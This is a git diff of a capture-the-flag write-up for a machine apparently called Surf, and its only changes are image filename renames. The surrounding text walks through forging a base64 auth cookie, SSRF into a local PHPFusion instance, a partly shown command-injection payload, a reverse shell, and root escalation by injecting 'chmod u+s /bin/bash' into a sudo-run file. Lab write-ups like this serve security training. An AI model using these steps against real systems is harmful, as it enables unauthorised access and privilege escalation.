@@ -43,21 +43,21 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 There's an administration directory present, and when viewed it just shows a login page:
 
-![](<../../../.gitbook/assets/image%20(3301).png>)
+![](../../../.gitbook/assets/surf-7.png)
 
 I tried default and weak credentials, but they don't work. When the traffic is viewed in Burp, we can see that there are some tokens being passed around:
 
-![](<../../../.gitbook/assets/image%20(3977).png>)
+![](../../../.gitbook/assets/surf-8.png)
 
 The `auth_status` cookie is just a `base64` encoded string of `{'success':'false'}`. Afterwards, the `auth_status` cookie is appended to every subsequent login attempt. We can easily replace this with `true` and be granted access to the admin dashboard:
 
-![](<../../../.gitbook/assets/image%20(2658).png>)
+![](../../../.gitbook/assets/surf-4.png)
 
 ### SSRF -> RCE
 
 Within the website, there isn't much functionality, but there is a 'Check Server Status' function:
 
-![](<../../../.gitbook/assets/image%20(2868).png>)
+![](../../../.gitbook/assets/surf-5.png)
 
 Here's the HTTP request sent:
 
@@ -83,7 +83,7 @@ url=http%3A%2F%2F127.0.0.1%3A8080
 
 This looks vulnerable to a SSRF, and we can confirm it is.
 
-![](<../../../.gitbook/assets/image%20(2632).png>)
+![](../../../.gitbook/assets/surf-3.png)
 
 Also, it tells us that the backend server is running PHPFusion. There are a few exploits available for PHPFusion:
 
@@ -134,7 +134,7 @@ url=http://127.0.0.1:8080/infusions/downloads/downloads.php?cat_id=$\{system(bas
 
 Then we can get a reverse shell and grab the user flag:
 
-![](<../../../.gitbook/assets/image%20(3006).png>)
+![](../../../.gitbook/assets/surf-6.png)
 
 ## Privilege Escalation
 
@@ -202,7 +202,7 @@ function getDbInstance() {
 
 We can then `su` to `james`:
 
-![](<../../../.gitbook/assets/image%20(477).png>)
+![](../../../.gitbook/assets/surf-9.png)
 
 ### Sudo Privileges
 
@@ -238,8 +238,8 @@ The exploit would be to write a small snippet making `/bin/bash` an SUID binary 
 
 We can use `vi` to edit the file to include `system("chmod u+s /bin/bash");`, and then use `:wq!` to force the save. Afterwards, when we can run the file using `sudo` as `james`:
 
-![](<../../../.gitbook/assets/image%20(2267).png>)
+![](../../../.gitbook/assets/surf-2.png)
 
 Then we can easily become the `root` user:
 
-![](<../../../.gitbook/assets/image%20(1320).png>)
+![](../../../.gitbook/assets/surf-1.png)
